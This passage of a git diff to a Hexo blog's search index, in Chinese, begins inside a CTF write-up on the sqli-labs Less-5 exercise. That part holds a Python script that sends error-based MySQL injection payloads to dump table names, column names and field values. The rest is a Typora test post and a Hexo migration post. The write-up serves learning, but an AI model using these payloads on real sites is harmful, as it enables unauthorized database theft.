+    if 'group_key' not in r.text:
+        break
+    table_name = r.text.split(':')[-2]
+    table_list.append(table_name)
+    print('[+]' + table_name)
+### 获取列名 ###
+#### 这里以users表为例 ####
+print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    column_name = r.text.split(':')[-2]
+    column_list.append(column_name)
+    print('[+]' + column_name)
+### 获取字段值 ###
+#### 这里以username列为例 ####
+print('%s列下的字段值:' % column_list[-2])
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    dump = r.text.split(':')[-2]
+    print('[+]' + dump)
+</code></pre>
+<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>尝试用typora写博客</title>
+    <url>/2020/07/03/typora/</url>
+    <content><![CDATA[<p>​    昨天花了一番时间搭建好博客后，匆匆用记事本写了一句话作为纪念，将其作为第一条博客测试了一下。成功了，但是总觉得那样写博客有些低效，而且怎么把它搞得花里胡哨呢<span class="github-emoji"><span>❓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<span id="more"></span>
+
+<p>​    在大佬的安利之下，我发现了 <strong>Trpora</strong> 这个强大的软件，今天就用它来写这篇博客。（第一次使用，用意不在内容，而是想测试一下各种花里胡哨的东西​ <span class="github-emoji"><span>😄</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>）</p>
+<p>​    话不多说，测试开始</p>
+<p><span class="github-emoji"><span>🥊</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f94a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<ul>
+<li><h4 id="首先，测试一下图片的插入-arrow-down-small"><a href="#首先，测试一下图片的插入-arrow-down-small" class="headerlink" title="首先，测试一下图片的插入:arrow_down_small:"></a>首先，测试一下图片的插入<span class="github-emoji"><span>🔽</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f53d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><p><img src="/2020/07/03/typora/wallhaven-ox7695.jpg"></p>
+</li>
+<li><p><img src="/2020/07/03/typora/wallhaven-49e9zx.jpg"></p>
+</li>
+</ul>
+<p><strong>美汁儿汁儿</strong><span class="github-emoji"><span>🤙</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f919.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+<ul>
+<li><h4 id="接着测试一下超链接"><a href="#接着测试一下超链接" class="headerlink" title="接着测试一下超链接"></a>接着测试一下超链接</h4><p><a href="http://www.baidu.com/">百度</a></p>
+<p>ojbk<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+</li>
+<li><h4 id="搞点代码恰恰-grey-question"><a href="#搞点代码恰恰-grey-question" class="headerlink" title="搞点代码恰恰:grey_question:"></a>搞点代码恰恰<span class="github-emoji"><span>❔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2754.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><p><code>printf("hello world!");</code></p>
+</li>
+</ul>
+<pre><code class="line-numbers language-c">#include &lt;stdio.h&gt;
+int main()
+{
+    printf("welcome!");
+}
+</code></pre>
+<ul>
+<li><h4 id="再整个表？听说Typora这个功能很强啊-black-flag"><a href="#再整个表？听说Typora这个功能很强啊-black-flag" class="headerlink" title="再整个表？听说Typora这个功能很强啊 :black_flag:"></a>再整个表？听说Typora这个功能很强啊 <span class="github-emoji"><span>🏴</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f3f4.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><p><code>ctrl+T</code> 插入表格</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>不知道该制个啥表，先空着吧，网上复制一个去(这功能tql)</p>
+<p>好家伙，找半天，没找到合适的，，，，以后再说吧</p>
+</li>
+</ul>
+<ul>
+<li><h4 id="引用点东西水一水字数-cold-sweat"><a href="#引用点东西水一水字数-cold-sweat" class="headerlink" title="引用点东西水一水字数:cold_sweat:"></a>引用点东西水一水字数<span class="github-emoji"><span>😰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><blockquote>
+<p>​        寂坐时，常想到晚明张岱。他写湖心亭：“崇祯五年十二月，余住西湖。大雪三日，湖中人鸟声俱绝。是日更定矣，余拿一小舟，拥毳衣炉火，独往湖心亭看雪。雾淞沆砀，天与云、与山、与水，上下一白。湖上影子，惟长堤一痕，湖心亭一点，与余舟一芥，舟中人两三粒而已。”</p>
+<p>​        深夜独自到湖上看大雪，他显然不觉寂寞——寂寞可能是美学的必要。但是，国破家亡、人事全非、当他在为自己写墓志铭的时候呢？</p>
+<p>​        蜀人张岱，陶庵其号也。少为纨绔子弟，极爱繁华，好精舍，好美婢，好娈童，好鲜衣，好美食，好骏马，好华灯，好烟火，好梨园，好鼓吹，好古董，好花鸟，兼以茶淫橘虐，书蠹诗魔，劳碌半生，皆成梦幻。年至五十，国破家亡，避迹山居。所存者，破床碎几，折鼎病琴与残书数帙，缺砚一方而已。布衣疏莨，常至断炊。回首二十年前，真如隔世。</p>
+<p>​        有一种寂寞，身边添一个可谈的人，一条知心的狗，或许就可以消减。有一种寂寞，茫茫天地之间“余舟一芥”的无边无际无着落，或许只能各自孤独面对，素颜修行吧。</p>
+<p>​                                                                                                                                                            ——龙应台《寂寞》</p>
+</blockquote>
+<hr>
+<p>OK，测试暂且到这吧，以后常用的大概就这些了。U1S1，Typora的确是个宝藏软件<span class="github-emoji"><span>🖕</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f595.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Typora</tag>
       </tags>
   </entry>
   <entry>
@@ -6479,6 +6445,41 @@ CODE      ENDS
         <tag>8259A</tag>
         <tag>8255</tag>
         <tag>8254</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>新电脑迁移hexo</title>
+    <url>/2025/07/16/%E6%96%B0%E7%94%B5%E8%84%91%E8%BF%81%E7%A7%BBhexo/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>换电脑有段时间了，但是一直没有将hexo博客给迁移到新电脑上，最近研究了一下如何迁移，在这里做一个记录，也作为迁移后的第一篇博客</p>
+<p>主要参考下面这篇文章进行：</p>
+<p><a href="https://blog.csdn.net/qq_36667170/article/details/118163563">换电脑后怎么迁移hexo博客？_hexo换电脑了怎么办-CSDN博客</a></p>
+<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1.<code>git bash here</code>卡死</p>
+<p>尝试过重装、降低git版本、装在C盘等方法都没有解决，后面直接用<code>cmd</code>执行相关命令</p>
+<p><img src="https://typics.oss-cn-hangzhou.aliyuncs.com/img/image-20250712224330583.png" alt="image-20250712224330583"></p>
+<p>2.Typora配置阿里云OSS存储权限问题</p>
+<p>参考<a href="https://blog.csdn.net/mayuxin1314/article/details/125911299">Typora+阿里云OSS实现图片自动上传（不需要安装软件）_typora oss-CSDN博客</a></p>
+<p>不过需要注意创建RAM用户后需要为用户分配相应的权限，例如<code>AliyunOSSFullAccess</code>，否则测试上传的实现会报错权限问题。</p>
+<h3 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h3><p>1.深入学习一下git，后续应该是可以通过git在不同的电脑上进行提交</p>
+<p>2.git bash here卡死问题</p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>最近在折腾博客的时候cursor误删了hexo本地文件夹，我想着GitHub上反正有备份，应该没有问题，结果clone下来一看和hexo本地文件夹并不太一样，还好之前U盘里有老的备份。</p>
+<p>其实，Github上存的只是生成后的静态文件，其实是源码文件夹下的public文件夹的内容</p>
+<pre><code>index.html
+css/
+js/
+images/
+</code></pre>
+<p>没有 <code>source/ themes/ package.json</code></p>
+<p>所以没办法<code>hexo s</code></p>
+<p>所以为了以后换电脑之后更好备份，也为了多台电脑之间可以协作，可以再创建一个仓库存储源码</p>
+<p>仓库 1：<code>blog-source</code>（存 Hexo 源码，纯存档/协作）</p>
+<p>仓库 2：现在这个（存部署产物，给 GitHub Pages 用）</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Git</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -8741,41 +8742,6 @@ int main()
         <tag>哈夫曼编码</tag>
         <tag>图</tag>
         <tag>内排序</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新电脑迁移hexo</title>
-    <url>/2025/07/16/%E6%96%B0%E7%94%B5%E8%84%91%E8%BF%81%E7%A7%BBhexo/</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>换电脑有段时间了，但是一直没有将hexo博客给迁移到新电脑上，最近研究了一下如何迁移，在这里做一个记录，也作为迁移后的第一篇博客</p>
-<p>主要参考下面这篇文章进行：</p>
-<p><a href="https://blog.csdn.net/qq_36667170/article/details/118163563">换电脑后怎么迁移hexo博客？_hexo换电脑了怎么办-CSDN博客</a></p>
-<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>1.<code>git bash here</code>卡死</p>
-<p>尝试过重装、降低git版本、装在C盘等方法都没有解决，后面直接用<code>cmd</code>执行相关命令</p>
-<p><img src="https://typics.oss-cn-hangzhou.aliyuncs.com/img/image-20250712224330583.png" alt="image-20250712224330583"></p>
-<p>2.Typora配置阿里云OSS存储权限问题</p>
-<p>参考<a href="https://blog.csdn.net/mayuxin1314/article/details/125911299">Typora+阿里云OSS实现图片自动上传（不需要安装软件）_typora oss-CSDN博客</a></p>
-<p>不过需要注意创建RAM用户后需要为用户分配相应的权限，例如<code>AliyunOSSFullAccess</code>，否则测试上传的实现会报错权限问题。</p>
-<h3 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h3><p>1.深入学习一下git，后续应该是可以通过git在不同的电脑上进行提交</p>
-<p>2.git bash here卡死问题</p>
-<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>最近在折腾博客的时候cursor误删了hexo本地文件夹，我想着GitHub上反正有备份，应该没有问题，结果clone下来一看和hexo本地文件夹并不太一样，还好之前U盘里有老的备份。</p>
-<p>其实，Github上存的只是生成后的静态文件，其实是源码文件夹下的public文件夹的内容</p>
-<pre><code>index.html
-css/
-js/
-images/
-</code></pre>
-<p>没有 <code>source/ themes/ package.json</code></p>
-<p>所以没办法<code>hexo s</code></p>
-<p>所以为了以后换电脑之后更好备份，也为了多台电脑之间可以协作，可以再创建一个仓库存储源码</p>
-<p>仓库 1：<code>blog-source</code>（存 Hexo 源码，纯存档/协作）</p>
-<p>仓库 2：现在这个（存部署产物，给 GitHub Pages 用）</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>Git</tag>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
